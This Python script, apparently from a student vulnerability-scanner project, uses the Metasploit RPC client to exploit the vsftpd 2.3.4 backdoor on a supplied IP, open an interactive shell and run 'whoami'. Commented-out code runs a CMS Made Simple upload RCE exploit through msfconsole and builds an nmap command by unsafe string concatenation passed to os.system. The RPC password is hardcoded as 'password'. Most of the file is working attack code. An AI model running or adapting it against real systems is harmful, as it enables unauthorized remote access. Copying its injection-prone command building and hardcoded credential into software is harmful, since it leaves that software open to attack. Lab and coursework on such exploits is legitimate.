from metasploit.msfrpc import MsfRpcClient
import os

def scan_vsftpd_234_backdoor(ip_addr):
    client = MsfRpcClient('password')

    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

    exploit['RHOST'] = ip_addr
    exploit['RPORT'] = "21"

    exploit.execute(payload="cmd/unix/interact")

    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
        print(s)

    shell = client.sessions.session(list(client.sessions.list.keys())[0])

    shell.write('whoami\n')

    print(shell.read())

    # shell.stop()

    os.system("py3clean .")





#import subprocess


# def nmap_scanning(ip_addr):
#     #check if host is scanned and is valid
    
#     #else
#     dst_output_nmap = "/home/marco/Documents/Uni/my-nessus/mysite/meta/nmap_output/" + ip_addr + ".xml"
#     # print(dst_output_nmap)

#     #run nmap to get service and version 
#     # nmap_output=subprocess.run(["nmap", "-A","-p-", ip_addr, "-oX", dst_output_nmap], capture_output=True)
#     nmap_cmd="nmap -A -p- -oX " + dst_output_nmap + " " + ip_addr
#     print(nmap_cmd)
#     nmap_output=os.system(nmap_cmd)

#     return nmap_output


# def metaploit_scan(service_info):
#     # meta_output=subprocess.run(["msfconsole", "-q","-x","search apache"], capture_output=True)
#     # print(meta_output)
#     output = os.system('msfconsole -q -r /var/www/html/meta/template/cmcms_upload_rename_rce.rc')
#     return output

# def getServicesInfo(ip_addr):
#     # extract nmap xml data
#     # dst_output_nmap = nmap_scanning(ip_addr)
#     # doc = xml.dom.minidom.parse(dst_output_nmap)

#     # #filter ports and services
#     # ports = doc.getElementsByTagName("port")
#     # for port in ports:
#     #     print(port.getAttribute("portid"))

#     # services = doc.getElementsByTagName("service")
#     # for service in services:
#     #     service.getAttribute("name") 
#     #     service.getAttribute("product")
#     #     service.getAttribute("version")
#     # services[1].getAttribute("product")
#     output = os.system('msfconsole -q -r /var/www/html/meta/template/cmcms_upload_rename_rce.rc')
#     print(output)
#     return "output"    